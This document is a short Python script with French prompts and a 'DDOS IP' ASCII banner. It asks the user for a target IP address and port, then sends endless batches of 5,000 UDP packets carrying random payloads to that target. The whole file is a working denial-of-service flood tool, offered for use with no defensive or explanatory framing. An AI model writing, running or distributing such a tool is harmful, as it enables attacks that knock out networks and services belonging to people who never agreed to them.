import socket
import random

MAGENTA = '\033[95m'
RESET = '\033[0m'

ascii_art = r'''
  ______  _____   ______   _____  _    _ 
 |  ____||  __ \ |  ____| / ____|| |  | | 
 | |__   | |__) || |__   | (___  | |__| | 
 |  __|  |  _  / |  __|   \___ \ |  __  | 
 | |     | | \ \ | |____  ____) || |  | | 
 |_|     |_|  \_\|______||_____/ |_|  |_| 

 ________ ________ ________ ________ ________
"""""""" """""""" """""""" """""""" """""""" 
             
                DDOS IP
'''

print(f"{MAGENTA}{ascii_art}{RESET}")

ip = input(f"{MAGENTA}Entrez l'IP a attaquer: ")

port = int(input(f"{MAGENTA}Entrez le port a attaquer: "))

print(f"{MAGENTA}'Attaque en cours sur {ip}:{port} ...")

client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

num_packets = 5000

while True:
    for i in range(num_packets):
        payload = str(random.randint(0, 100000000)).encode()
        
        try:
            client_socket.sendto(payload, (ip, port))
        except Exception as e:
            print(f"Erreur lors de l'envoi du paquet {i}: {e}")
            break

        if i % 100 == 0:
            print(f"{MAGENTA}{i} paquets envoyer dans cette serie...")

    print(f"{MAGENTA}Serie de {num_packets} paquets envoyer. Redemarrage...")

input("\nAppuyez sur une touche pour quitter...")